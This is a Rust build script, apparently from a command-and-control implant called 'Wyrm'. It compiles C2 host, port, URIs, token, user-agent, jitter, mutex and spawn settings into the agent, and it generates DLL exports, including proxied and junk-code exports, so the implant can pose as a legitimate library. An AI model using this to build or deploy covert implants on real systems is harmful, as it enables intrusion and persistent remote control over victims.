use std::{env, fmt::Write, fs, path::PathBuf};

fn main() {
    let envs = &[
        "DEF_SLEEP_TIME",
        "C2_HOST",
        "C2_URIS",
        "C2_PORT",
        "SECURITY_TOKEN",
        "USERAGENT",
        "AGENT_NAME",
        "JITTER",
        "SVC_NAME",
        "EXPORTS_JMP_WYRM",
        "EXPORTS_USR_MACHINE_CODE",
        "EXPORTS_PROXY",
        "MUTEX",
        "DEFAULT_SPAWN_AS",
    ];

    for key in envs {
        println!("cargo:rerun-if-env-changed={key}");
    }

    for var in envs {
        if let Ok(val) = env::var(var) {
            println!("cargo:rustc-env={var}={val}");
        }
    }

    write_exports_to_build_dir();
}

/// Writes exported symbols to the binary, whether genuine exports or proxied ones.
fn write_exports_to_build_dir() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest = out_dir.join("custom_exports.rs");
    let mut code = String::new();

    let exports_usr_machine_code = env::var("EXPORTS_USR_MACHINE_CODE").ok();
    let exports_proxy = env::var("EXPORTS_PROXY").ok();
    let exports_jmp_wyrm = env::var("EXPORTS_JMP_WYRM").ok();

    if let Some(export_str) = exports_jmp_wyrm {
        if export_str.is_empty() {
            // If there was no custom export defined, then we just export the 'run' extern
            writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
        }

        for fn_name in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            writeln!(
                &mut code,
                "build_dll_export_by_name_start_wyrm!({fn_name});",
            )
            .unwrap();
        }
    } else {
        // Just in case.. we still need an entrypoint, tho this should never run
        writeln!(&mut code, "build_dll_export_by_name_start_wyrm!(run);",).unwrap();
    }

    if let Some(export_str) = exports_usr_machine_code {
        for item in export_str.split(';').filter(|s| !s.trim().is_empty()) {
            let mut parts = item.split('=');
            let name = parts.next().unwrap().trim();
            let bytes = parts.next().unwrap_or("").trim();

            assert!(!name.is_empty());
            assert!(!bytes.is_empty());

            writeln!(
                &mut code,
                "build_dll_export_by_name_junk_machine_code!({name}, {bytes});",
            )
            .unwrap();
        }
    }

    if let Some(exports) = exports_proxy {
        for item in exports
            .split(';')
            .map(|s| s.trim())
            .filter(|s| !s.is_empty() && s.is_ascii())
        {
            println!("cargo:rustc-link-arg=/export:{item}");
        }
    }

    fs::write(dest, code).unwrap();
}
